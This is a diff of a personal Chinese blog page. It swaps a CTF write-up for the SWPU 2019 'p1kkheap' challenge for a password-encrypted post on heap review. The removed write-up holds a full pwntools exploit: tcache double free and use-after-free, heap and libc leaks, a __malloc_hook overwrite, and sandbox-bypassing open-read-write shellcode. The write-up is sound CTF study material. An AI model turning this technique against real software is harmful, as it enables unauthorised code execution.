@@ -20,27 +20,28 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="攻击tcache_struct,double free,uaf,orw">
+    <meta name="description" content="堆复习">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SWPU 2019 p1kkheap">
-<meta property="og:url" content="http://example.com/2023/10/11/SWPU-2019-p1kkheap/index.html">
+<meta property="og:title" content="堆复习">
+<meta property="og:url" content="http://example.com/2025/03/19/%E5%A0%86%E5%A4%8D%E4%B9%A0/index.html">
 <meta property="og:site_name" content="lianwu&#39;s blog">
-<meta property="og:description" content="攻击tcache_struct,double free,uaf,orw">
+<meta property="og:description" content="堆复习">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-10-11T02:30:09.000Z">
-<meta property="article:modified_time" content="2023-10-11T02:34:36.765Z">
+<meta property="article:published_time" content="2025-03-19T02:14:02.000Z">
+<meta property="article:modified_time" content="2025-03-21T13:42:13.533Z">
 <meta property="article:author" content="lianwu">
 <meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="http://example.com/2023/10/11/SWPU-2019-p1kkheap/">
+<link rel="canonical" href="http://example.com/2025/03/19/%E5%A0%86%E5%A4%8D%E4%B9%A0/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/10/11/SWPU-2019-p1kkheap/","path":"2023/10/11/SWPU-2019-p1kkheap/","title":"SWPU 2019 p1kkheap"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2025/03/19/%E5%A0%86%E5%A4%8D%E4%B9%A0/","path":"2025/03/19/堆复习/","title":"堆复习"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>SWPU 2019 p1kkheap | lianwu's blog</title>
+<title>堆复习 | lianwu's blog</title>
   
 
 
@@ -183,7 +184,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/11/SWPU-2019-p1kkheap/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/19/%E5%A0%86%E5%A4%8D%E4%B9%A0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -196,12 +197,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="SWPU 2019 p1kkheap | lianwu's blog">
-      <meta itemprop="description" content="攻击tcache_struct,double free,uaf,orw">
+      <meta itemprop="name" content="堆复习 | lianwu's blog">
+      <meta itemprop="description" content="堆复习">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          SWPU 2019 p1kkheap
+          堆复习
         </h1>
 
         <div class="post-meta-container">
@@ -211,28 +212,39 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2023-10-11 10:30:09 / 修改时间：10:34:36" itemprop="dateCreated datePublished" datetime="2023-10-11T10:30:09+08:00">2023-10-11</time>
+      <time title="创建时间：2025-03-19 10:14:02" itemprop="dateCreated datePublished" datetime="2025-03-19T10:14:02+08:00">2025-03-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-03-21 21:42:13" itemprop="dateModified" datetime="2025-03-21T21:42:13+08:00">2025-03-21</time>
     </span>
 
   
 </div>
 
-            <div class="post-description">攻击tcache_struct,double free,uaf,orw</div>
+            <div class="post-description">堆复习</div>
         </div>
       </header>
 
     
     
     
-    <div class="post-body" itemprop="articleBody"><p> glibc-2.27</p>
-<p>PIE开启</p>
-<p>存在uaf和double</p>
-<p>选择攻击tcache_struct，改变tcache_bin的内容泄露libc_base，改变链表头实现任意内存写</p>
-<p>同时程序开启了沙盒，需要进行orw，在buf上写orw_shellcode，修改malloc_hook为shellcode，程序限制malloc次数和free次数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r=process(&quot;./pwn&quot;)</span><br><span class="line">r=remote(&quot;node5.anna.nssctf.cn&quot;,28244)</span><br><span class="line">elf=ELF(&quot;./pwn&quot;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line">context(arch=&quot;amd64&quot;,os=&quot;linux&quot;)</span><br><span class="line">def add(size):</span><br><span class="line">    r.recvuntil(&quot;Your Choice: &quot;)</span><br><span class="line">    r.sendline(&quot;1&quot;)</span><br><span class="line">    r.recvuntil(&quot;size: &quot;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def show(id):</span><br><span class="line">    r.recvuntil(&quot;Your Choice: &quot;)</span><br><span class="line">    r.sendline(&quot;2&quot;)</span><br><span class="line">    r.recvuntil(&quot;id: &quot;)</span><br><span class="line">    r.sendline(str(id))</span><br><span class="line"></span><br><span class="line">def edit(id,content):</span><br><span class="line">    r.recvuntil(&quot;Your Choice: &quot;)</span><br><span class="line">    r.sendline(&quot;3&quot;)</span><br><span class="line">    r.recvuntil(&quot;id: &quot;)</span><br><span class="line">    r.sendline(str(id))</span><br><span class="line">    r.recvuntil(&quot;content: &quot;)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line">def delete(id):</span><br><span class="line">    r.recvuntil(&quot;Your Choice: &quot;)</span><br><span class="line">    r.sendline(&quot;4&quot;)</span><br><span class="line">    r.recvuntil(&quot;id: &quot;)</span><br><span class="line">    r.sendline(str(id))</span><br><span class="line"></span><br><span class="line">#gdb.attach(r)</span><br><span class="line">add(0x100)#0</span><br><span class="line">add(0x100)#1</span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line">#pause()</span><br><span class="line">show(0)</span><br><span class="line">r.recvuntil(&quot;content: &quot;)</span><br><span class="line">heap_base=u64(r.recvuntil(&quot;\n&quot;,drop=True).ljust(8,b&quot;\x00&quot;))-0x260</span><br><span class="line">print(hex(heap_base))</span><br><span class="line">add(0x100)#2</span><br><span class="line">edit(2,p64(heap_base))</span><br><span class="line"></span><br><span class="line">add(0x100)#3</span><br><span class="line">add(0x100)#4</span><br><span class="line">edit(4,p64(0)+p64(0x251)+b&quot;\x07&quot;*0x40)</span><br><span class="line">delete(3)</span><br><span class="line">show(3)</span><br><span class="line">main_arena_addr=u64(r.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))-96</span><br><span class="line">print(hex(main_arena_addr))</span><br><span class="line">libc.address=main_arena_addr-0x3ebc40</span><br><span class="line">print(hex(libc.address))</span><br><span class="line">malloc_hook_addr=libc.sym[&quot;__malloc_hook&quot;]</span><br><span class="line">print(hex(malloc_hook_addr))</span><br><span class="line">buf=0x66660000</span><br><span class="line"></span><br><span class="line">edit(4,p64(0)+p64(0x251)+b&quot;\x07&quot;*0x40+p64(malloc_hook_addr)+p64(0)*5+p64(buf))</span><br><span class="line">shellcode=asm(shellcraft.open(&quot;/flag&quot;)+shellcraft.read(3,buf+0x500,0x30)+shellcraft.write(1,buf+0x500,0x30))</span><br><span class="line"></span><br><span class="line">add(0x70)#buf,5</span><br><span class="line">edit(5,shellcode)</span><br><span class="line">add(0x10)#malloc,6</span><br><span class="line"></span><br><span class="line">edit(6,p64(buf))</span><br><span class="line"></span><br><span class="line">add(0x10)</span><br><span class="line">print(r.recvline())</span><br></pre></td></tr></table></figure>
-
+    <div class="post-body" itemprop="articleBody"><div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="dd92b4e16201c907b38265ca18ac500f3092acfa9538ba8ae8b9f445697c9fc2">bbdb498cd3daf08c34e36d1e2699e0fc5fd856750c615648916541a6af5eb451c53990debee3b918f302ebe231ab2b2b5ddfa8a6d2faefd26e4763a135c6932cb16c3e0d12df189c3c47e89a0925650285f41e32ea5bea9c6d8beda2c4e5ae225e3a60aa1491e945ec2e082d768601ed1d51831bd98c6b9b9969623b9964dcda041f304961f1fd97bc93cf94f4f5b1c28fc11f2bf5103f4784b6d9673450cc4065292cee6dafe716c0c158b6ec68404fc661b15399ba812d42e471d40072518450e6557fa28bc898d8522ca15a21b80c61ee32ffb981625920951c3bb51305126c17c80788bcae224f3974dbe4a5c70bf0b060bc0a840d8c9e0a8baa25ba66fd0f0be833ace632305983b95a1e1095aa8d67ce65bac2f5c4b26cd6284e82a10df057f3ff1ff76e12903283c21408ef7e0a5f02ef81f43c773abadfea11886bfe8b30be0b10592de651c0dc97232406063a17745c3a3a406d97c9b07e86ed57b42f04906d2dd809dc88832d0d105c278c6ba359301e8b81fe0bfdcccd71ed49294fd6d41a9fe8eb6bdd43e7263ab11be306399ce6b155add1408cc04c6a6989f860e83b4fc5cd482228c1bb161a8cf6b78af0e6bc6d9091b95c5fe2cbaa4c1e3accddf0c968e823d7fae944a0d97a5218edc642d429652b218bbb424a89d4c6e689c423c2f3224a8265fbbbcfc9b4efd096e5cf5f994de5339930f02b504f9363fc0ae9d1d4ee14579ab187476b54576f8e8513b209349fc04662b0d7bf0cc135eec10d35155f0515bc4861d9a27e97d02efb09a46d7ca4b90e0511e92d8598094dec2f529f03597024779151f4d1c7144f97f782a8de757121f1598242e7eea92a13f3fe7c31c018b703de50c5e47da599cf3c55fa4768e203cb7ca8def1d76254dd6cb12d7e852943e4122f4d6a45597b6e4b37dea280605cba59be953aaed219d11d77b08abb075f6b2df0e120c4f27d5a3a5bcfd3a6161b48bcceda39eea48f2939f2d3cb702901f14b52de314b02c83da1f8ac062e3b221166c9d63af347f88d769982a53e5b9679c7acc7a6b3a43015d10d1c6891c1f542790a67e555a1df8b2aea858cd014fd74059758ec1a700feec763f7c0a1720b4ea03bba3a5d217e3c39a626c20473b15425c86845fea2d56ddba3d2fbd4feff5156e2e89055f56762049b008b6c40364c537af34863553726a38ab08e81e2046f3c5895ff9b32f6559d49afd5a8f6d76d3e4f24ed3f40e206c423e422c9a141a3b4f40f586e8250dfc2a351da7f772503b78eca47a61949df742194fecfd093cb49ddb326ea5f50e022f877d955a0e9def36525019743eff310a45a201e780ec2aa59b31f6c5b4bd8d10d8928942fe95f9f4500dc059e5474bfe482f6c7c0f88594c6f3155b34499fe299bf8538edd3a049afefa3f1789d67e99e6bc761de7379409f5f7ce6750b6e56b61e246326618b3be89cf44ff5533ccac98927b15f27f9b3ee08149bdbc0bf8c452c8bacd2e2d9f78a0efcdc3cd8c8fd67b4a2eef04b3e48dcaa0a7415efd3cabd3ed0c1246239745adda0fef27691e829f914431a4172ab8fba1585f8b601ec85b6b1ad7e4dee7f2f8fd55ee8396148f695dff070b1e2644836cc1e9ace80635fecf9103a30e197626e604119afdeca7fd92c36ac3d7147fcbf06cf96bb3d72216e79511499e3f8263634836b13f4249557890704ef7201ff0d06a8ece37464cc19dc1712de671edf9deb6a7a10fe39ecd2201d0d1d21c1704214ad215c313b9dcdac886d8658aa504b47c42fdf8460e25a9bb61aac5539fe6b200c8c4a9bf58c903b27f96be025f86126da3efc76184c5e94513efc103c7fbcff6d4baa26bd29dbf2a62d62b34fd215651aa272cd0880fae4bc43a6fac59aafc620864f1f3a179ac963abcc076ecc280a0108f8cfc93865b8a9b48689ef4cbcb35b7615749975b374d6dc1968c832f2f552e077c0afc8fc2e945881949b6a20514e6e146b2934e0f3a4095d8840f136786e2d49f51050785e148963bd69b30f1954aabe632daade0e9e1ce954ce874a3632b579d830e47927d0fe502a810faad7548b0cfa8699b1ce43df182389a9e4b887d30ae999a6377ab227d007823184b9046c0e632956f72323c289499070c069cef88cb927901e326706bebc51633b20b8355382186cec16b59f1b40f267f65c2ef2e65067d06162f6d39855699de8d43a4b0f6ccdb48920a50763399821902858758b9c5ea455bd8163f5631520a505aec2b8cdf8a60f1c5a0f7927a91a166064db952de1c28b4f359a731f6ed5eafd0aa937ae969a60802a14cee6a0aac54312e3dc92b5f5eb5350262daf726f5ebc2303a39aad94850cafaa9ab2c0f705147f208494531e907a1a71a034c67d93499cddcb22badce0156585f4ef60d670dbb1c3509cb3cc8bbe8499006a6ede59417d4f694a53e8065b78c9e6897bdc1ec4f98e156549cdfbccfacc86dea65bb8fa6eb13211fde3d8ed01f40676477e15d8a4f80700ccc99d844b659494ea7e63fbc3b5b01307fe39492d3f4e3893910cf408539ef0aba289454efbb2cd96da1f0fc0197a360e2bc04dedda1940aae47d298f51f2e0d76f4fb546f02bce7feb1cafe9585458a3871909ffa82147f8bd4ebe66e33e4ede0ed2a530f367c876a0a81d4ed5f4329bfab36c01faa09e8c2e599790995479bbb65e7d3230348baf3f185d407c2315487014a1dca9d8ef33786fe0515774812cd4a277479a5356ffea26379c54cf2bc5d3a58cc9934421a44119c54caad3ad8a0f97afac54b514202872b7bb4ba308f89818d512b198c9ac2a8fa018da8c1355ed51f36bb724160639a0779d9be97da014d995656bee26afd253401dbcc8af3399b3203fc1c93ff8eeb3e379af5d6b53423d0ccd6b3f8f7bca3867105e8594ea8aaa63bbb4744cace2e41cac24e486fd78f37e9f91e521922bfaacc4c40f3c32c923da5423d4668e5c81dbed56e993e25f0a68551146abef8717b2d47e02ea8920496af45ef3f4a0ae2e67a9dec83523537d4e5c02aa168b09c3116a28d11515565400b50d24f5f0aa409d01b159c6576e9b4e9d3dcce8d59d04a1f31fcdcce6b2ee532adc313feeb6679abd37950a26c429967fc9e6089e9cd0f6fde9a5034029a14830087d401dc283947cec675b8974cb32074e1d438d4b735407f03f782de16171797f9d92c3094bd5313214433f28bef5d230e471e648897263aeeb53b78e65817cda190fbdf148a02bfa2e6a5f9839daa77ef315fc837891c54eb5db9d0d754d954fed9574d92b67b7d77eb654d1393336f01bf6afff3524fc8bd7eee2de9764ca87ab1108b53c26828be9e13f3cf2ac6fedd4dc985ecc7bccfec027e86a47f050d3bd618ea0901e943732a30a603eec4acaf770d9161880fa74b7bb34cf049e4157f5a196f2513a7e72</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
     </div>
 
     
@@ -242,20 +254,18 @@
     <footer class="post-footer">
           <div class="post-tags">
               <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/heap/" rel="tag"># heap</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2023/10/10/buckeyectf-2023/" rel="prev" title="buckeyectf-2023">
-                  <i class="fa fa-angle-left"></i> buckeyectf-2023
+                <a href="/2025/03/09/IOT%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/" rel="prev" title="iot环境遇到的一些问题">
+                  <i class="fa fa-angle-left"></i> iot环境遇到的一些问题
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2023/10/12/intorw/" rel="next" title="intorw">
-                  intorw <i class="fa fa-angle-right"></i>
-                </a>
             </div>
           </div>
     </footer>
